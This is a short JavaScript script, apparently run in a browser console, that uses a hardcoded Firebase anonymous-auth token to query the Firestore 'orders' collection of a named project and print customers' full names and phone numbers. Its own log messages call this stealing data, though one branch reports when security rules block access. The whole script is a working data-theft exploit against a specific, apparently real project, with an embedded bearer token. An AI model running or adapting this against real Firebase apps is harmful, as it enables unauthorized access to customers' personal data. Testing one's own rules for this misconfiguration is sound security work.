// 1. PASTE THE TOKEN YOU JUST GOT HERE:
const HACKER_TOKEN = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjNzQ5NTFmNjBhMDE0NzE3ZjFlMzA4ZDZiMjgwZjQ4ZjFlODhmZGEiLCJ0eXAiOiJKV1QifQ.eyJwcm92aWRlcl9pZCI6ImFub255bW91cyIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9iYWZzZHZhcnNpdHkiLCJhdWQiOiJiYWZzZHZhcnNpdHkiLCJhdXRoX3RpbWUiOjE3NjQ5MDgyMDQsInVzZXJfaWQiOiJXOUYwd3BMSkpOVlZxV0NkYzlEV3h1WDYzc2sxIiwic3ViIjoiVzlGMHdwTEpKTlZWcVdDZGM5RFd4dVg2M3NrMSIsImlhdCI6MTc2NDkwODIwNCwiZXhwIjoxNzY0OTExODA0LCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7fSwic2lnbl9pbl9wcm92aWRlciI6ImFub255bW91cyJ9fQ.DsP7xVlUEK4IqDjv9VbR3FkGDCt9JYHIDgKwMhWW0LdArDMw7K1_cGMtGtHuIhg3qTtHg-DOT1OfF45_Crl_3FC8XymMLVYpMTsQdAV5GV884ukRyafU0kKlMDfmx4CK109KEAKDUl2hQ5kXFnSn5q_uHhh6jvJpVPBB6pvB4asY2eivKXorTLHJo3c3nP9vu3TQDt43b30sVfRXLATngvAeeaxsswuu1cJnUj8ThHG9mwSXN8lhIbKYIwPUD1fo_89wrjxIIGx-v4zCBBJiOyfYRaitwb4ibw3ln_sN7WLHtzdW9TdEOQXr6fHHdRTj8xcEUsVB3yd95IJHqnICfg"; 

const PROJECT_ID = "bafsdvarsity";
const PATH = "artifacts/bafsdvarsity/public/data/orders";

// We use the REST API, but this time we attach the stolen "Keys"
const url = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/${PATH}?pageSize=5`;

console.log("🕵️‍♂️ Attempting to steal data using Anonymous Token...");

fetch(url, {
  method: 'GET',
  headers: {
    // This tells Firestore: "Trust me, I am a logged-in user"
    'Authorization': 'Bearer ' + HACKER_TOKEN 
  }
})
.then(res => res.json())
.then(data => {
  if (data.documents) {
    console.log("%c🚨 HACK SUCCESSFUL: DATA STOLEN!", "color: red; font-size: 20px; font-weight: bold;");
    console.log("Because Anonymous Auth is enabled, I used that token to bypass your security.");
    console.log("Here is the private data:");
    
    data.documents.forEach(doc => {
       const f = doc.fields;
       console.log("Name:", f.fullName?.stringValue, "| Phone:", f.phoneNumber?.stringValue);
    });
  } else if (data.error) {
    console.log("Server Response:", data.error);
    if (data.error.status === "PERMISSION_DENIED") {
        console.log("%c✅ Safe.", "color: green;");
        console.log("Even with a token, the rules blocked access. (This means your Rules are good!)");
    }
  }
});